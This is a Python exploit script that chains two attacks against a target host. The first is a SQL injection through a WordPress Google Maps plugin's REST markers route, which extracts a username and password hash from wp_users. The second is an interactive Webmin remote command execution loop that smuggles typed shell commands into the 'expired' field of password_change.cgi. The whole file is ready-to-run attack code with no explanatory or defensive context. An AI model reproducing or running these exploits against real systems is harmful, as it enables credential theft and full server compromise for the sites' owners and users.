#!/usr/bin/env python3
import requests,urllib3,argparse

parser = argparse.ArgumentParser()
parser.add_argument("--url","-u",help="The target URL, example: 127.0.0.1",type=str,required=True)
args = parser.parse_args()

def sql(host):
    print ("-----SQLi in WordPress Google Maps Plugin-----")
    xpl = "/?rest_route=/wpgmza/v1/markers&filter=a&fields=* from wp_users-- -"
    r = requests.get(f"http://{host}/"+xpl)
    return (r.text.split('"')[7]+":"+r.text.split('"')[11])
print (sql(args.url))
print ("\n-----WEBMIN RCE-----")

while True:
    def exploit(host):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        xpl = input("Command: ")
        rhost = (f"https://{host}:10000/password_change.cgi")
        params = {"user":"wheel",
        "pam":"",
        "expired":f"2|{xpl}",
        "old":"123",
        "new1":"wheel",
        "new2":"wheel",
        }
        header = {"Referer":"https://"+host+":10000/session_login.cgi"}
        r = requests.post(rhost,data=params,headers=header,verify=False)
        text = r.text.split("chosen.")[1]
        if (r.status_code == 500):
            return (text.replace("</p>",""))
        else:
            return False
    print (exploit(args.url))
